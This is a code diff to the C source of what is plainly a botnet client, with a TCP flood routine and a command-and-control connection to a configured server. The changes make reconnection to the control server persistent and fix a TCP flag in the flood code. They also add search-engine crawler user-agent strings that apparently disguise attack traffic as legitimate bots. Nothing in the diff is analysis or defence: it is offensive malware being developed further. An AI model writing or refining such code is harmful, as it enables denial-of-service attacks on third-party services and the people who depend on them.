@@ -36,6 +36,8 @@
 #define DEFAULT_PPS 100000
 #define DEFAULT_DELAY 1
 #define SOCKETS_PER_THREAD 4
+#define RECONNECT_DELAY 5
+#define MAX_RECONNECT_ATTEMPTS 0
 
 static int sock = -1;
 static int running = 1;
@@ -95,6 +97,17 @@ const char *user_agents[] = {
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+    "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
+    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
+    "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
+    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
+    "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
+    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
 };
 
 #define NUM_USER_AGENTS (sizeof(user_agents) / sizeof(user_agents[0]))
@@ -541,7 +554,7 @@ void *tcp_bypass_flood(void *arg) {
         if (flags[flag_index] & TH_ACK) tcp_header->ack = 1;
         if (flags[flag_index] & TH_FIN) tcp_header->fin = 1;
         if (flags[flag_index] & TH_RST) tcp_header->rst = 1;
-        if (flags[flag_index] & TH_PUSH) tcp_header->psh = 1;
+        if (flags[flag_index] & TH_PSH) tcp_header->psh = 1;
         
         tcp_header->window = htons(1024 + (rand() % 64511));
         tcp_header->check = 0;
@@ -1049,6 +1062,9 @@ int connect_to_cnc() {
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) return -1;
     
+    int flag = 1;
+    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
+    
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(CNC_PORT);
     if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) <= 0) {
@@ -1078,12 +1094,15 @@ void reconnect_loop() {
     fd_set readfds;
     struct timeval tv;
     char buffer[BUFFER_SIZE];
+    int reconnect_attempts = 0;
     
     while (running) {
         if (sock < 0) {
-            connect_to_cnc();
-            if (sock < 0) {
-                sleep(5);
+            if (connect_to_cnc() == 0) {
+                reconnect_attempts = 0;
+            } else {
+                reconnect_attempts++;
+                sleep(RECONNECT_DELAY);
                 continue;
             }
         }
